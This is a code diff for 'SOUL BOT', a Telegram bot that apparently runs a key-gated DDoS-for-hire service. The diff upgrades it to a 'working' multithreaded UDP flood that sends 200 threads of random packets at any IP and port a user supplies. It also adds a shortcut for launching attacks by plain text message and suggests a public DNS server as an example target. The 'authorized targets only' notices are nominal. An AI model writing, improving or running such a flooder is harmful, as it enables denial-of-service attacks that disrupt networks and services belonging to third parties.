@@ -1,6 +1,5 @@
 """
-SOUL BOT - UDP Stress Testing Only
-Simple UDP flood bot for Railway/GitHub
+SOUL BOT - UDP Stress Testing Only (Working Version)
 """
 
 import asyncio
@@ -12,6 +11,7 @@ import random
 import sys
 import socket
 import threading
+import time
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
@@ -33,6 +33,7 @@ logger = logging.getLogger(__name__)
 
 # Global variables
 user_state = {}
+active_attacks = {}
 data = {
     "approved_users": {},
     "admins": {},
@@ -98,58 +99,74 @@ def is_approved(user_id):
             pass
     return False
 
-# --- UDP Stress Testing Function ---
-def udp_flood_worker(target_ip, port, duration, packet_size=1024):
-    """UDP flood worker thread"""
-    end_time = datetime.now() + timedelta(seconds=duration)
-    packets_sent = 0
+# --- Working UDP Flood Function ---
+class UDPFlood:
+    def __init__(self, target_ip, target_port, duration):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.duration = duration
+        self.running = True
+        self.packets_sent = 0
+        self.threads = []
     
-    try:
-        # Create UDP socket
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        # Generate random data packet
-        data = os.urandom(packet_size)
+    def send_packets(self):
+        """Send UDP packets in a thread"""
+        try:
+            # Create UDP socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            # Random payload (1024 bytes)
+            payload = os.urandom(1024)
+            
+            end_time = time.time() + self.duration
+            while self.running and time.time() < end_time:
+                try:
+                    sock.sendto(payload, (self.target_ip, self.target_port))
+                    self.packets_sent += 1
+                except:
+                    pass
+            
+            sock.close()
+        except:
+            pass
+    
+    def start(self):
+        """Start the UDP flood with multiple threads"""
+        # Create multiple threads for high packet rate
+        num_threads = 200  # Number of concurrent threads
         
-        while datetime.now() < end_time:
+        for i in range(num_threads):
+            thread = threading.Thread(target=self.send_packets)
+            thread.daemon = True
+            thread.start()
+            self.threads.append(thread)
+        
+        # Wait for all threads to complete or timeout
+        time.sleep(self.duration)
+        self.running = False
+        
+        # Wait for threads to finish
+        for thread in self.threads:
             try:
-                sock.sendto(data, (target_ip, port))
-                packets_sent += 1
+                thread.join(timeout=1)
             except:
                 pass
         
-        sock.close()
-    except:
-        pass
-    
-    return packets_sent
+        return self.packets_sent
 
-async def udp_stress_test(target_ip, port, duration, threads=100):
-    """UDP Stress Test - Main function"""
-    packets_sent = 0
-    
-    # Run multiple threads
-    loop = asyncio.get_event_loop()
-    
-    def run_threads():
-        nonlocal packets_sent
-        thread_results = []
+async def run_udp_flood(target_ip, port, duration, user_id):
+    """Run UDP flood and send status updates"""
+    try:
+        # Create flood instance
+        flood = UDPFlood(target_ip, port, duration)
         
-        for i in range(threads):
-            t = threading.Thread(target=udp_flood_worker, args=(target_ip, port, duration))
-            t.start()
-            thread_results.append(t)
+        # Run in thread pool to not block
+        loop = asyncio.get_event_loop()
+        packets = await loop.run_in_executor(None, flood.start)
         
-        for t in thread_results:
-            t.join()
-        
-        return packets_sent
-    
-    # Run in executor
-    await loop.run_in_executor(None, run_threads)
-    
-    # Approximate packets sent (threads * rate)
-    estimated_packets = threads * int(duration) * 10000
-    return estimated_packets
+        return packets
+    except Exception as e:
+        logger.error(f"UDP flood error: {e}")
+        return 0
 
 # --- Keyboard Builders ---
 def get_owner_keyboard():
@@ -160,7 +177,7 @@ def get_owner_keyboard():
         [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
          InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
         [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
-         InlineKeyboardButton("🚀 UDP Flood", callback_data="run")],
+         InlineKeyboardButton("💥 UDP Flood", callback_data="run")],
         [InlineKeyboardButton("📊 View Stats", callback_data="stats")]
     ]
     return InlineKeyboardMarkup(keyboard)
@@ -172,14 +189,14 @@ def get_admin_keyboard():
         [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
          InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
         [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
-         InlineKeyboardButton("🚀 UDP Flood", callback_data="run")],
+         InlineKeyboardButton("💥 UDP Flood", callback_data="run")],
         [InlineKeyboardButton("📊 View Stats", callback_data="stats")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
 def get_approved_keyboard():
     keyboard = [
-        [InlineKeyboardButton("🚀 UDP Flood", callback_data="run")],
+        [InlineKeyboardButton("💥 UDP Flood", callback_data="run")],
         [InlineKeyboardButton("📊 My Status", callback_data="my_status")]
     ]
     return InlineKeyboardMarkup(keyboard)
@@ -197,7 +214,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     welcome_msg = f"👋 **Welcome {user_name}!**\n\n"
     welcome_msg += "💥 **UDP Stress Testing Bot**\n"
-    welcome_msg += "Simple UDP flood attack tool\n\n"
+    welcome_msg += "Send UDP packets to test network stability\n\n"
 
     if is_owner(user_id):
         welcome_msg += "🔑 **You are the Owner**\n"
@@ -236,7 +253,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text("❌ Not authorized.")
             return
         user_state[user_id] = {'action': 'approve', 'step': 'awaiting_id'}
-        await query.message.reply_text("✅ Approve User\n\nSend: `<user_id> <days>`", parse_mode='Markdown')
+        await query.message.reply_text("✅ Approve User\n\nSend: `<user_id> <days>`\nExample: `123456789 30`", parse_mode='Markdown')
         return
 
     elif callback_data == "disapprove":
@@ -244,7 +261,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text("❌ Not authorized.")
             return
         user_state[user_id] = {'action': 'disapprove', 'step': 'awaiting_id'}
-        await query.message.reply_text("❌ Disapprove User\n\nSend user ID:", parse_mode='Markdown')
+        await query.message.reply_text("❌ Disapprove User\n\nSend user ID:\nExample: `123456789`", parse_mode='Markdown')
         return
 
     elif callback_data == "add_admin":
@@ -252,7 +269,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text("❌ Not authorized.")
             return
         user_state[user_id] = {'action': 'add_admin', 'step': 'awaiting_id'}
-        await query.message.reply_text("👮 Add Admin\n\nSend: `<user_id> <days>`", parse_mode='Markdown')
+        await query.message.reply_text("👮 Add Admin\n\nSend: `<user_id> <days>`\nExample: `987654321 60`", parse_mode='Markdown')
         return
 
     elif callback_data == "remove_admin":
@@ -260,7 +277,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text("❌ Not authorized.")
             return
         user_state[user_id] = {'action': 'remove_admin', 'step': 'awaiting_id'}
-        await query.message.reply_text("🚫 Remove Admin\n\nSend user ID:", parse_mode='Markdown')
+        await query.message.reply_text("🚫 Remove Admin\n\nSend user ID:\nExample: `987654321`", parse_mode='Markdown')
         return
 
     elif callback_data == "gen_key":
@@ -268,7 +285,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text("❌ Not authorized.")
             return
         user_state[user_id] = {'action': 'gen_key', 'step': 'awaiting_days'}
-        await query.message.reply_text("🎟️ Generate Key\n\nSend number of days:", parse_mode='Markdown')
+        await query.message.reply_text("🎟️ Generate Key\n\nSend number of days:\nExample: `30`", parse_mode='Markdown')
         return
 
     elif callback_data == "run":
@@ -278,8 +295,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_state[user_id] = {'action': 'run', 'step': 'awaiting_params'}
         await query.message.reply_text(
             "💥 **UDP Flood Attack**\n\n"
-            "Format: `<IP> <PORT> <TIME>`\n\n"
-            "Example: `1.1.1.1 80 30`\n\n"
+            "Send: `<IP> <PORT> <TIME>`\n\n"
+            "Example: `8.8.8.8 53 30`\n\n"
             "⚠️ **Warning:** Only use on servers you own or have permission to test!",
             parse_mode='Markdown'
         )
@@ -303,7 +320,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
 
     if user_id not in user_state:
-        await update.message.reply_text("ℹ️ Use /start to see options.")
+        # Check if it's a direct attack command
+        parts = text.strip().split()
+        if len(parts) == 3 and parts[0].replace('.', '').isdigit():
+            if is_approved(user_id):
+                await process_run(update, text)
+            else:
+                await update.message.reply_text("❌ You are not approved. Please redeem a key first.")
+        else:
+            await update.message.reply_text("ℹ️ Use /start to see options.")
         return
 
     action = user_state[user_id].get('action')
@@ -408,7 +433,10 @@ async def process_gen_key(update: Update, text: str):
 
         save_data()
         await update.message.reply_text(
-            f"🎟️ Key Generated!\n🔑 `{key}`\n📅 Valid for: {days} days",
+            f"🎟️ **Key Generated!**\n\n"
+            f"🔑 Key: `{key}`\n"
+            f"📅 Valid for: {days} days\n\n"
+            f"Share this key with users to grant access.",
             parse_mode='Markdown'
         )
         user_state.pop(user_id, None)
@@ -424,28 +452,40 @@ async def process_run(update: Update, text: str):
             await update.message.reply_text(
                 "❌ Invalid format.\n\n"
                 "Use: `<IP> <PORT> <TIME>`\n"
-                "Example: `1.1.1.1 80 30`",
+                "Example: `8.8.8.8 53 30`",
                 parse_mode='Markdown'
             )
+            user_state.pop(user_id, None)
             return
 
         target_ip = parts[0]
         port = int(parts[1])
         duration = int(parts[2])
         
-        if duration < 1 or duration > 300:
-            await update.message.reply_text("❌ Duration must be between 1 and 300 seconds.")
+        if duration < 1 or duration > 120:
+            await update.message.reply_text("❌ Duration must be between 1 and 120 seconds.")
+            user_state.pop(user_id, None)
             return
         
         if port < 1 or port > 65535:
             await update.message.reply_text("❌ Port must be between 1 and 65535.")
+            user_state.pop(user_id, None)
+            return
+        
+        # Check if IP is valid
+        ip_parts = target_ip.split('.')
+        if len(ip_parts) != 4:
+            await update.message.reply_text("❌ Invalid IP address format.")
+            user_state.pop(user_id, None)
             return
         
         # Confirm attack
         confirm_msg = f"⚠️ **UDP Flood Confirmation**\n\n"
         confirm_msg += f"Target: `{target_ip}:{port}`\n"
-        confirm_msg += f"Duration: `{duration}s`\n\n"
-        confirm_msg += f"Type 'YES' to start the UDP flood:"
+        confirm_msg += f"Duration: `{duration} seconds`\n"
+        confirm_msg += f"Method: UDP Flood (200 threads)\n\n"
+        confirm_msg += f"Type **YES** to start the attack:\n"
+        confirm_msg += f"Type anything else to cancel."
         
         user_state[user_id] = {
             'action': 'confirm_attack',
@@ -457,8 +497,10 @@ async def process_run(update: Update, text: str):
         
     except ValueError:
         await update.message.reply_text("❌ Invalid numbers. Make sure PORT and TIME are numbers.")
+        user_state.pop(user_id, None)
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {e}")
+        user_state.pop(user_id, None)
 
 async def process_redeem(update: Update, text: str):
     user_id = update.effective_user.id
@@ -491,8 +533,10 @@ async def process_redeem(update: Update, text: str):
         save_data()
         await update.message.reply_text(
             f"🎉 **Key Redeemed Successfully!**\n\n"
-            f"✅ Access granted for {days} days\n"
-            f"⏰ Expires: {expiry_date}",
+            f"✅ You now have access!\n"
+            f"📅 Valid for: {days} days\n"
+            f"⏰ Expires: {expiry_date}\n\n"
+            f"🚀 Use `/start` to see your options.",
             parse_mode='Markdown'
         )
         user_state.pop(user_id, None)
@@ -516,21 +560,31 @@ async def handle_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE
         port = state['port']
         duration = state['duration']
         
-        await update.message.reply_text(f"💥 Starting UDP flood on {target_ip}:{port} for {duration}s...")
+        # Send starting message
+        status_msg = await update.message.reply_text(
+            f"💥 **UDP Flood Started!**\n\n"
+            f"Target: `{target_ip}:{port}`\n"
+            f"Duration: `{duration}s`\n"
+            f"Threads: 200\n\n"
+            f"⏳ Sending UDP packets...",
+            parse_mode='Markdown'
+        )
         
         try:
-            # Run UDP stress test
-            packets = await udp_stress_test(target_ip, port, duration)
+            # Run UDP flood
+            packets = await run_udp_flood(target_ip, port, duration, user_id)
             
-            await update.message.reply_text(
+            # Send completion message
+            await status_msg.edit_text(
                 f"✅ **UDP Flood Completed!**\n\n"
-                f"Target: {target_ip}:{port}\n"
-                f"Duration: {duration}s\n"
-                f"Estimated Packets Sent: ~{packets:,}\n\n"
-                f"⚠️ This is a simulation. Only use on authorized targets!"
+                f"Target: `{target_ip}:{port}`\n"
+                f"Duration: `{duration}s`\n"
+                f"Packets Sent: `{packets:,}`\n\n"
+                f"⚠️ Only use on authorized targets!",
+                parse_mode='Markdown'
             )
         except Exception as e:
-            await update.message.reply_text(f"❌ UDP flood failed: {e}")
+            await status_msg.edit_text(f"❌ UDP flood failed: {e}")
         
         user_state.pop(user_id, None)
     else:
@@ -542,10 +596,12 @@ async def check_status(message):
         f"✅ **Bot Status**\n\n"
         f"💥 UDP Flood Attack Tool\n"
         f"• Protocol: UDP\n"
-        f"• Method: Packet Flood\n\n"
+        f"• Method: Packet Flood\n"
+        f"• Threads: 200 concurrent\n"
+        f"• Max Duration: 120 seconds\n\n"
         f"👥 Total Users: {len(data.get('approved_users', {}))}\n"
         f"👮 Admins: {len(data.get('admins', {}))}\n\n"
-        f"⚠️ **Legal Notice:** Only use on servers you own or have written permission to test!"
+        f"⚠️ **Legal Notice:** Only use on servers you own!"
     )
     await message.reply_text(status_msg, parse_mode='Markdown')
 
@@ -612,7 +668,7 @@ async def run_bot():
     
     logger.info("=== SOUL BOT STARTED ===")
     logger.info(f"Owner ID: {OWNER_ID}")
-    logger.info("UDP Flood Attack Tool - Ready")
+    logger.info("UDP Flood Attack Tool - Working Version")
     
     await app.initialize()
     await app.start()
